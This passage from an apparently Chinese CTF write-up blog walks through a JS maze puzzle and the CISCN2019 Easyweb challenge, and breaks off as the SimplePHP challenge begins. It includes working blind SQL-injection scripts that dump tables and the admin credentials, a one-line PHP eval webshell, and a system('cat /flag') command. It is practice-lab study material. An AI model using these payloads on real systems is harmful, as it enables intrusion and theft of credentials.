class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeydown</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;<br>  event = event || <span class="hljs-variable language_">window</span>.<span class="hljs-property">event</span>;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">keyCode</span> == <span class="hljs-number">27</span>) &#123; <span class="hljs-comment">//若按下esc</span><br>    event.<span class="hljs-title function_">preventDefault</span>();<span class="hljs-comment">//阻止浏览器跳转到其他页面</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/chase/&quot;</span>;<span class="hljs-comment">//将当前页面的 URL 设置为 &quot;/chase/&quot;，实现页面跳转到 &quot;/chase/&quot;</span><br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-title function_">die</span>();<span class="hljs-comment">//否则调用die函数</span><br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">dietimer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">10000</span>); <span class="hljs-comment">//等待十秒调用die函数</span><br>  <span class="hljs-title function_">die</span>();<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">die</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<span class="hljs-comment">//页面跳转到die</span><br>&#125;<br><br><span class="hljs-title function_">dietimer</span>();<br></code></pre></td></tr></table></figure><p>我们看看<code>chase</code>页面：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>     &#125;<br><br>     <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">dietimer</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1000</span>);<br>       <span class="hljs-title function_">die</span>();<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">die</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">left</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">leftt</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/leftt/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">function</span> <span class="hljs-title function_">right</span>(<span class="hljs-params"></span>) &#123;<br>       <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>     &#125;<br><br>     <span class="hljs-title function_">dietimer</span>();<br></code></pre></td></tr></table></figure><p>我们跳转到<code>leftt</code>：</p><p><img src="/img/welcometoearth2.png" alt="welcometoearth2"></p><p>跳转到<code>/shoot/</code>:</p><p><img src="/img/welcometoerath3.png" alt="welcometoerath3"></p><p>跳转到<code>/door</code>，是这么个东西:</p><p><img src="/img/welcometoooooooooooooooooooearth4.png" alt="welcometoooooooooooooooooooearth4"></p><p>大致就是选择一个数字，选错了就跳转到<code>/die/</code>界面</p><p>一开始以为是要爆破。。但看了会儿发现不知道怎么提交的这个参数，看源码发现有这么个东西：</p><p><code>/static/js/door.js</code>，访问：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">check_door</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> all_radio = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;door_form&quot;</span>).<span class="hljs-property">elements</span>;<br>  <span class="hljs-keyword">var</span> guess = <span class="hljs-literal">null</span>;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; all_radio.<span class="hljs-property">length</span>; i++)<br>    <span class="hljs-keyword">if</span> (all_radio[i].<span class="hljs-property">checked</span>) guess = all_radio[i].<span class="hljs-property">value</span>;<br><br>  rand = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">360</span>);<br>  <span class="hljs-keyword">if</span> (rand == guess) <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/open/&quot;</span>;<br>  <span class="hljs-keyword">else</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/die/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>大致意思就是猜数，他这个应该没有检验啥的，我们直接跳过去<code>open</code>下看看：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">open</span>(<span class="hljs-params">i</span>) &#123;<br>  <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">open</span>(i + <span class="hljs-number">1</span>);<br>  &#125;);<br>  <span class="hljs-keyword">if</span> (i == <span class="hljs-number">4000000000</span>) <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;/fight/&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接去<code>fight</code>，看源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Run to scramble original flag</span><br><span class="hljs-comment">//console.log(scramble(flag, action));</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">scramble</span>(<span class="hljs-params">flag, key</span>) &#123;<span class="hljs-comment">//flag会被混淆，key是混淆用的秘钥</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; key.<span class="hljs-property">length</span>; i++) &#123;<br>    <span class="hljs-keyword">let</span> n = key.<span class="hljs-title function_">charCodeAt</span>(i) % flag.<span class="hljs-property">length</span>;<br>    <span class="hljs-keyword">let</span> temp = flag[i];<br>    flag[i] = flag[n];<br>    flag[n] = temp;<br>  &#125;<br>  <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">check_action</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> action = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;action&quot;</span>).<span class="hljs-property">value</span>;<br>  <span class="hljs-keyword">var</span> flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>];<br><br>  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> unscramble function</span><br>&#125;<br></code></pre></td></tr></table></figure><p>使用一个<code>for</code>循环来遍历密钥的每个字符。在每次迭代中，它通过<code>key.charCodeAt(i)</code>获取密钥字符的ASCII码，并将其与原始标志的长度取模，得到一个索引值<code>n</code>。然后，它使用一个临时变量<code>temp</code>来保存原始标志中的第<code>i</code>个字符。接下来，它将原始标志中的第<code>i</code>个字符替换为原始标志中的第<code>n</code>个字符，并将原始标志中的第<code>n</code>个字符替换为<code>temp</code>。这样就实现了对原始标志的混淆。</p><p>下面那个就是被打乱顺序的<code>flag</code>，要把它拼成正确的顺序。</p><p><code>pctf</code>的话肯定放在第一位，然后就是<code>&#123;hey</code>，中间不知道，结尾是<code>ck!&#125;</code></p><p>参考<code>https://www.cnblogs.com/upfine/p/16542916.html</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><span class="hljs-keyword">import</span> re<br><br>flag = [<span class="hljs-string">&quot;&#123;hey&quot;</span>, <span class="hljs-string">&quot;_boy&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;s_im&quot;</span>, <span class="hljs-string">&quot;ck!&#125;&quot;</span>, <span class="hljs-string">&quot;_baa&quot;</span>, <span class="hljs-string">&quot;aaaa&quot;</span>, <span class="hljs-string">&quot;pctf&quot;</span>]<br><span class="hljs-comment"># 对flag字典里的内容进行排列组合</span><br>item = permutations(flag) <span class="hljs-comment">#permutations函数通常用于生成给定集合的所有排列</span><br><span class="hljs-comment"># 遍历</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> item:<br>    k = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">list</span>(a))<br>    <span class="hljs-comment"># 匹配</span><br>    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">&#x27;^pctf\&#123;hey_boys[a-zA-z_]+ck!\&#125;$&#x27;</span>, k):<br>        <span class="hljs-built_in">print</span>(k)<br></code></pre></td></tr></table></figure><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p><img src="/img/ciscneasyweb1.png" alt="ciscneasyweb1"></p><p>登陆界面，先用<code>dirsearch</code>扫，发现存在<code>robots.txt</code>:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>*.php.bak<br></code></pre></td></tr></table></figure><p>不过没告诉是啥。。看下源码，注意：</p><p><img src="/img/ciscneasyweb3.png" alt="ciscneasyweb3"></p><p><code>image.php</code>进去就是个图片，<code>user.php</code>进不去，回到<code>index.php</code>了。用这三个文件试试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//image.php.bak，另外两个没有</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><p>这里对<code>id</code>进行了两次处理：第一次<code>addslashes</code>第二次<code>str_replace</code>。看了<code>wp</code>知道这里存在单引号逃逸的问题，比如我输入<code>\\0</code>，先经过<code>addslashes</code>会变成<code>\\\\0</code>，其中<code>\\0</code>会被替换成空剩<code>\\</code>，这东西会把后面紧跟的<code>&#39;</code>给转义，比如：</p><p><code>select * from iamges where id=&#39;\\&#39; or path=&#39; or 1=1 # &#39;</code></p><p>这时<code>id</code>的值是<code>&#39; or path=</code>，后面那个单引号注释掉就行。</p><p><code>/image.php?id=\\0&amp;path=or 1=1 %23</code></p><p><img src="/img/ciscneasyweb4.png" alt="ciscneasyweb4"></p><p><code>/image.php?id=\\0&amp;path=or 1=0 %23</code></p><p><img src="/img/ciscneasyweb5.png" alt="ciscneasyweb5"></p><p>布尔盲注，先看看要怎么区分这两个页面(其实就是id&#x3D;1和id&#x3D;0)：</p><p><code>id=1</code></p><p><img src="/img/ciscneasyweb6.png" alt="ciscneasyweb6"></p><p><code>id=0</code></p><p><img src="/img/ciscneasyweb7.png" alt="ciscneasyweb7"></p><p>通过<code>JF</code>区分就行:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c0a9f91-d286-48a3-9bac-5dc484fbca9a.node4.buuoj.cn:81/image.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):<br>    right = <span class="hljs-number">127</span><br>    left = <span class="hljs-number">32</span><br>    mid = (right + left)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        payload = <span class="hljs-string">&quot; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)<br>        params = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;\\0&#x27;</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span>: payload<br>        &#125;<br>        response = requests.get(url, params=params)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        mid = (right + left)//<span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p><code> images,users</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c0a9f91-d286-48a3-9bac-5dc484fbca9a.node4.buuoj.cn:81/image.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):<br>    right = <span class="hljs-number">127</span><br>    left = <span class="hljs-number">32</span><br>    mid = (right + left)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        payload = <span class="hljs-string">&quot; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)<br>        params = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;\\0&#x27;</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span>: payload<br>        &#125;<br>        response = requests.get(url, params=params)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        mid = (right + left)//<span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>id,path,username,password</p><p>注意这里不能直接’users’因为单引号被过滤了，要么直接爆库里的所有列名，要么和其它师傅一样把<code>&#39;users&#39;</code>这个字符串转换成十六进制。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://3c0a9f91-d286-48a3-9bac-5dc484fbca9a.node4.buuoj.cn:81/image.php&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">30</span>):<br>    right = <span class="hljs-number">127</span><br>    left = <span class="hljs-number">32</span><br>    mid = (right + left)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> right &gt; left:<br>        payload = <span class="hljs-string">&quot; or if(ascii(substr((select group_concat(username,password) from (users)),%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)<br>        params = &#123;<br>            <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-string">&#x27;\\0&#x27;</span>,<br>            <span class="hljs-string">&#x27;path&#x27;</span>: payload<br>        &#125;<br>        response = requests.get(url, params=params)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            right = mid<br>        mid = (right + left)//<span class="hljs-number">2</span><br><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>admin  8ef403207a4691e2271b</p><p>登录：</p><p><img src="/img/ciscneastweb7.png" alt="ciscneastweb7"></p><p>直接上传<code>php</code>后缀的报错了，试试其它后缀发现<code>phtml</code>的可以：</p><p><img src="/img/ciscneasyweb8.png" alt="ciscneasyweb8"></p><p>访问<code>log/upload.19b6649eefbd2ed612b5e53d34e1a1c8.log.php</code></p><p><img src="/img/ciscneasyweb9.png" alt="ciscneasyweb9"></p><p>可以看到他只是单纯把文件名存到这个日志文件里了，真正上传到哪去了我也没找到。。</p><p>不过这个日志文件的后缀是<code>.php</code>，是不是可以直接上传一个文件名是一句话木马，然后没后缀的文件？</p><p>前面知道<code>php</code>这东西大小写都被过滤了，不过一句话还有其它写法，比如:</p><p><code>&lt;?=@eval($_POST[&#39;a&#39;]);?&gt;</code></p><p><img src="/img/ciscneasyweb10.png" alt="ciscneasyweb10"></p><p>传完了直接访问就行，不过不知道怎么回事我这个页面并没有我上传这个东西的文件名？但命令可以正常执行</p><p><img src="/img/ciscneasyweb12.png" alt="ciscneasyweb12"></p><p>POST<code>a=system(&#39;cat /flag&#39;);</code>就行</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p><img src="/img/simplephp1.png" alt="simplephp1"></p><p>唉，好像又是文件上传</p><p><img src="/img/simplephp2.png" alt="simplephp2"></p><p>源码中存在提示：<code>&lt;!--flag is in f1ag.php--&gt; </code></p><p>同时注意到<code>file.php?file=</code>这东西，想着用伪协议读读源码啥的发现读不了。。直接输进去反而有回显：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//file.php?file=index.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;base.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=base.php</span><br><span 